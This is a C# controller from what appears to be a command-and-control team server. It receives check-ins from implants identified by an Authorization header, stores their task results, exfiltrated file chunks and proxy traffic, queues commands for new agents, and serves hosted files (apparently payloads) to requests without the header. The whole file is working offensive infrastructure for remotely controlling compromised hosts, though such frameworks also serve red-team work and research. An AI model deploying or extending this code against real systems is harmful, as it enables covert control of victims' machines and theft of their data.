using ApiModels.Changes;
using ApiModels.Response;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using TeamServer.Models.File;
using TeamServer.Services;

namespace TeamServer.Models
{
    [Controller]
    public class HttpListenerController : ControllerBase
    {
        private IAgentService _agentService;
        private IFileService _fileService;
        private IListenerService _listenerService;
        private IBinMakerService _binMakerService;
        private ILoggerFactory _loggerFactory;
        private readonly IChangeTrackingService _changeTrackingService;
        private readonly IWebHostService _webHostService;

        public HttpListenerController(IAgentService agentService, 
            IFileService fileService, 
            IListenerService listenerService, 
            IBinMakerService binMakerService, 
            ILoggerFactory loggerFactory, 
            IChangeTrackingService changeTrackingService,
            IWebHostService webHostService)
        {
            this._agentService=agentService;
            this._fileService = fileService;
            this._listenerService = listenerService;
            this._binMakerService = binMakerService;
            this._loggerFactory = loggerFactory;
            this._changeTrackingService = changeTrackingService;
            this._webHostService = webHostService;
        }


        private async Task<IActionResult> WebHost(string path)
        {
            Logger.Log($"WebHost request {path}");
            //var logger = _loggerFactory.CreateLogger("WebHost");
            //logger.LogInformation($"{id}");

            try
            {
                var fileContent = _webHostService.Get(path);

                if(fileContent == null)
                {
                    //logger.LogError($"NOT FOUND {fileName} from listener {listener.Name}");
                    Logger.Log($"NOT FOUND {path}");
                    return this.NotFound();
                }

                Logger.Log($"GET {path}");

                return this.File(fileContent, "application/octet-stream");
            }
            catch (Exception ex)
            {
                Logger.Log($"WebHost Error : {ex}");
                return NotFound("Error");
            }
        }

        const string AuthorizationHeader = "Authorization";

        public async Task<IActionResult> HandleRequest(string relativeUrl)
        {
            if (this.Request.Headers.ContainsKey(AuthorizationHeader))
            {
                var agent = this.Request.Headers[AuthorizationHeader].ToString();
                if (string.IsNullOrEmpty(agent))
                    return NotFound();

                return await this.HandleImplant(agent);
            }
            else
            {
                return await this.WebHost(relativeUrl);
            }
        }


        private async Task<ActionResult> HandleImplant(string id)
        {
            var listener = this._listenerService.GetListeners().FirstOrDefault(l => l.BindPort == this.Request.Host.Port);

            var agent = this.CheckIn(id, listener);

            //System.IO.File.AppendAllText("log.log", calledUri + Environment.NewLine);
            if (HttpContext.Request.Method == "POST")
            {
                string json;
                using (var sr = new StreamReader(HttpContext.Request.Body))
                    json = await sr.ReadToEndAsync();

                var result = JsonConvert.DeserializeObject<List<MessageResult>>(json);

                foreach (var messRes in result)
                {
                    var agentId = messRes.Header.Owner;
                    var messAgent = this.CheckIn(messRes.Header.Owner, listener);

                    if (messRes.MetaData != null)
                    {
                        messAgent.Metadata = messRes.MetaData;
                        this._changeTrackingService.TrackChange(ChangingElement.Agent, messAgent.Id);
                    }

                    messAgent.AddTaskResults(messRes.Items);
                    foreach (var res in messRes.Items)
                        this._changeTrackingService.TrackChange(ChangingElement.Result, res.Id);

                    messAgent.RelayId = id;
                    if (messAgent.Path != messRes.Header.Path)
                    {
                        messAgent.Path = messRes.Header.Path;
                        this._changeTrackingService.TrackChange(ChangingElement.Agent, messAgent.Id);
                    }
                    if (messRes.FileChunk != null)
                        _fileService.AddAgentFileChunk(messRes.FileChunk);

                    messAgent.AddProxyResponses(messRes.ProxyMessages);

                    ////Logger.Log($"Saving resulst of {messAgent.Metadata.Id}");
                    _fileService.SaveResults(messAgent, messRes.Items);
                }

            }

            var messages = new List<MessageTask>();
            foreach (var ag in this._agentService.GetAgentToRelay(id))
            {
                var mess = ag.GetNextMessage();
                if (mess != null)
                    messages.Add(mess);
            }

            return Ok(messages);
        }

        private Agent CheckIn(string agentId, Listener listener)
        {
            var agent = this._agentService.GetAgent(agentId);

            this._changeTrackingService.TrackChange(ChangingElement.Agent, agentId);

            if (agent == null)
            {
                agent = new Agent(agentId);
                this._agentService.AddAgent(agent);
                var meta = new AgentTask() { Command = "meta", Id = Guid.NewGuid().ToString(), Label = "MetaData", RequestDate = DateTime.UtcNow };
                agent.QueueTask(meta);
                this._changeTrackingService.TrackChange(ChangingElement.Task, meta.Id);
            }

            agent.CheckIn();

            if (listener != null && agent.ListenerId != listener.Id)
                    agent.ListenerId = listener.Id;

            return agent;
        }
    }
}
